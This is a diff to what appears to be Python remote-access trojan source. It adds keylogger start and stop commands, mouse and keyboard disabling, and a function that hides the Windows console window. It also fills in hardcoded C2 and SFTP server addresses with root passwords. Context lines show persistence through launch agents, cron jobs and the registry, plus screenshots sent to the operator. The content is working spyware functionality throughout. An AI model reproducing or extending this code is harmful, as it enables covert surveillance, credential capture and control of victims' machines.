@@ -4,20 +4,27 @@ from PIL import ImageGrab
 import time
 import platform
 import os
+from KeyLogger import KeyLogger
+from DeviceHooker import DeviceHooker
 
-
-# TODO: keylogger, webcam, disable mouse/keyboard
+# TODO: webcam, disable mouse/keyboard
 # TODO: screenshot indexing
 
-C2_SERVER_ADDR = ''
-C2_SERVER_SSH_USERNAME = ''
-C2_SERVER_SSH_PASSWORD = ''
+C2_SERVER_ADDR = '172.16.30.1'
+C2_SERVER_SSH_USERNAME = 'root'
+C2_SERVER_SSH_PASSWORD = 'toor'
 
-SFTP_SERVER_ADDR = ''
+SFTP_SERVER_ADDR = '172.16.30.134'
 SFTP_SERVER_PORT = 22
-SFTP_SERVER_USERNAME = ''
-SFTP_SERVER_PASSWORD = ''
-SFTP_SERVER_UPLOAD_DIR = ''
+SFTP_SERVER_USERNAME = 'root'
+SFTP_SERVER_PASSWORD = 'CoCo9191'
+SFTP_SERVER_UPLOAD_DIR = '/root/Desktop/SFTP-Upload/'
+
+KEY_LOGGER_FILE = 'C:\\Users\\phoebus\\Desktop\\Neuer Ordner\\keylogs.log'
+
+
+key_logger = KeyLogger()
+device_hooker = DeviceHooker()
 
 
 def screenshot():
@@ -48,15 +55,15 @@ def persist():
     try:
         # MAC OS X
         if current_os == 'Darwin':
-            from Utilities import create_launch_agent_plist
+            from PersistenceUtilities import create_launch_agent_plist
             create_launch_agent_plist(path_to_payload)
         # LINUX
         elif current_os == 'Linux':
-            from Utilities import create_cron_job
+            from PersistenceUtilities import create_cron_job
             create_cron_job(path_to_payload)
         # WINDOWS
         elif current_os == 'Windows':
-            from Utilities import set_reg
+            from PersistenceUtilities import set_reg
             if path_to_payload.endswith(".py"):
                 path_to_payload = path_to_payload.replace(".py", ".exe")
             set_reg("payload", path_to_payload)
@@ -105,6 +112,15 @@ def connect_to_c2server():
             connected = False
 
 
+def hide():
+    if platform.system() == 'Windows':
+        import win32console, win32gui
+
+        window = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(window, 0)
+        return True
+
+
 def handle_communication(chan):
     connected = True
     while connected:
@@ -117,6 +133,21 @@ def handle_communication(chan):
                 chan.send(screenshot())
             elif 'persist' in cmd:
                 response = persist()
+            elif 'keylogger_start' in cmd:
+                response = key_logger.start()
+            elif 'keylogger_stop' in cmd:
+                response = key_logger.stop()
+            elif 'mouse_disable' in cmd:
+                response = device_hooker.hook_mouse()
+            elif 'mouse_enable' in cmd:
+                response = device_hooker.unhook_mouse()
+            elif 'keyboard_disable' in cmd:
+                response = device_hooker.hook_keyboard()
+            elif 'keyboard_enable' in cmd:
+                response = device_hooker.unhook_keyboard()
+            elif 'hide' in cmd:
+                hide()
+                response = 'Window hidden'
             elif 'quit' in cmd:
                 response = 'Goodbye'
             else:
